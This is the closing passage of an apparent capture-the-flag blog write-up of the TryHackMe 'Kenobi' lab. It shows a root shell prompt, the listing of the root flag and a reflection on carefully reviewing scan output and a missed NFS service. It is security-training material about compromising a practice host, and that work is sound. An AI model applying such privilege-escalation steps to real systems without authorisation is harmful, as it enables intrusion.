+</span></span><span style=display:flex><span>See <span style=color:#e6db74>&#34;man sudo_root&#34;</span> <span style=color:#66d9ef>for</span> details.
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>root@kenobi:~# 
+</span></span></code></pre></div><p>Success! This elevated me to a root shell and quickly I found the last flag sitting in the <code>/root/</code> directory.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@kenobi:/# cd /root/
+</span></span><span style=display:flex><span>root@kenobi:/root# ls
+</span></span><span style=display:flex><span>root.txt
+</span></span></code></pre></div><h2 id=summary>Summary <a href=#summary class=anchor>🔗</a></h2><p>This attack reinforced how much discipline is necessary when reading through exfiltrated information. There were mountains of information made available in scans and files laying around that, if they weren&rsquo;t reiterated as often as they were, could have easily been missed. A perfect example of this is how I missed the NFS server listening on port 111, which I only found on my second pass through the host.</p></div><div class=tags><a href=https://ncatelli.github.io/tags/ctf>ctf</a>
+<a href=https://ncatelli.github.io/tags/boot2root>boot2root</a>
+<a href=https://ncatelli.github.io/tags/hacking>hacking</a>
+<a href=https://ncatelli.github.io/tags/writeup>writeup</a>
+<a href=https://ncatelli.github.io/tags/tryhackme>tryhackme</a></div></section></main><footer id=footer><div id=social><a class=symbol href=https://github.com/ncatelli/ rel=me target=_blank><svg fill="#bbb" width="28" height="28" viewBox="0 0 72 72" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><title>Github</title><desc>Created with Sketch.</desc><defs/><g id="Page-1" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd"><g id="Social-Icons---Rounded-Black" transform="translate(-264.000000, -939.000000)"><g id="Github" transform="translate(264.000000, 939.000000)"><path d="M8 72H64c4.418278.0 8-3.581722 8-8V8c0-4.418278-3.581722-8-8-8H8c-4.418278 811624501e-24-8 3.581722-8 8V64c541083001e-24 4.418278 3.581722 8 8 8z" id="Rounded" fill="#bbb"/><path d="M35.9985 13C22.746 13 12 23.7870921 12 37.096644c0 10.6440272 6.876 19.6751861 16.4145 22.8617681C29.6145 60.1797862 30.0525 59.4358488 30.0525 58.7973276 30.0525 58.2250681 30.0315 56.7100863 30.0195 54.6996482c-6.6765 1.4562499-8.085-3.2302544-8.085-3.2302544-1.0905-2.7829884-2.664-3.5239139-2.664-3.5239139C17.091 46.4500754 19.4355 46.4801943 19.4355 46.4801943c2.4075.1701719 3.675 2.4833051 3.675 2.4833051 2.142 3.6820383 5.6175 2.6188404 6.9855 2.0014024C30.3135 49.4077535 30.9345 48.3460615 31.62 47.7436831 26.2905 47.1352808 20.688 45.0691228 20.688 35.8361671c0-2.6308879.9345-4.781379 2.4705-6.4665327C22.911 28.7597262 22.0875 26.3110578 23.3925 22.9934585c0 0 2.016-.6475568 6.6 2.4697516C31.908 24.9285993 33.96 24.6620468 36.0015 24.6515052 38.04 24.6620468 40.0935 24.9285993 42.0105 25.4632101c4.581-3.1173084 6.5925-2.4697516 6.5925-2.4697516C49.9125 26.3110578 49.089 28.7597262 48.8415 29.3696344 50.3805 31.0547881 51.309 33.2052792 51.309 35.8361671c0 9.2555448-5.6115 11.29309-10.9575 11.8894446.860999999999997.7439374 1.629 2.2137408 1.629 4.4621184C41.9805 55.4089489 41.9505 58.0067059 41.9505 58.7973276 41.9505 59.4418726 42.3825 60.1918338 43.6005 59.9554002 53.13 56.7627944 60 47.7376593 60 37.096644 60 23.7870921 49.254 13 35.9985 13" fill="#fff"/></g></g></g></svg></a></div><div class=copyright></div></footer></body></html>
